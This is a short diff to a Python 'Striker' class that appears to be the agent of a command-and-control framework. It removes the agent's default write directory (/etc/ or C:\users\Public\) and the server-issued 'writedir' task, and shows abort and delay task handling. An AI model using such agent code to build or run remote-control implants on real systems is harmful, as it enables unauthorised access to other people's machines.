@@ -36,14 +36,6 @@ class Striker:
         pass
     elif (os.name in ["nt"]):
       self.os = "windows"
-    self.writeDir = os.getcwd()
-    if self.os == "linux":
-      self.writeDir = "/etc/"
-    elif self.os == "windows":
-      self.writeDir = "C:\\users\\Public\\"
-    else:
-      if self.writeDir[-1] != "/":
-        self.writeDir += "/"
 
   def httpGet(self, url):
     try:
@@ -219,14 +211,6 @@ class Striker:
     elif (task["taskType"] == "abort"):
       self.abort = True
       result = "Session aborted!"
-      successful = 1
-    elif (task["taskType"] == "writedir"):
-      self.writeDir = data["dir"]
-      if self.os == "windows" and self.writeDir[-1] != "\\":
-        self.writeDir += "\\"
-      elif self.writeDir[-1] != "/":
-        self.writeDir += "/"
-      result = "Write directory updated: " + self.writeDir
       successful = 1
     elif (task["taskType"] == "delay"):
       self.delay = int(data["delay"])
